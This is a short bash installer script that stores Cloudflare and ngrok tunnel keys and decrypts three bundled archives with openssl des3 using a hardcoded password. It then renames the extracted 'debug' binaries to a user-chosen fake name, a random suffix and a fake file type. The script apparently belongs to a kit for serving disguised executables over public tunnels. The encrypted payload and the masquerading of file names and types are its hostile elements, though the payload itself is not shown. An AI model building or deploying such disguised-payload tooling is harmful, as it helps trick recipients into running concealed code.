#!/bin/bash
echo 'installing..'

echo -n "CF_Key:"
read cfkey
echo "$cfkey" > config/ID

echo -n "NG_Key:"
read ngkey
echo "$ngkey" > config/ID-ng

echo -n "File fake name title:"
read fakename
echo "$fakename""." > config/1-alice

echo -n "File fake type:"
read type
echo ".""$type" > config/2-type

sleep 10

cat /dev/urandom | tr -dc A-Za-z0-4 | head -c 7 > config/random &

sleep 10

dd if=debug-test.spk |openssl des3 -d -k G9rIDmo33|tar zxf -
dd if=debug-ng.spk |openssl des3 -d -k G9rIDmo33|tar zxf -
dd if=debug.spk |openssl des3 -d -k G9rIDmo33|tar zxf -

sleep 10

mv debug `cat config/1-alice``cat config/random``cat config/2-type`
mv debug-test `cat config/1-alice``cat config/random`-test`cat config/2-type`
mv debug-ng `cat config/1-alice``cat config/random`-ng`cat config/2-type`

sleep 2
echo 'done'

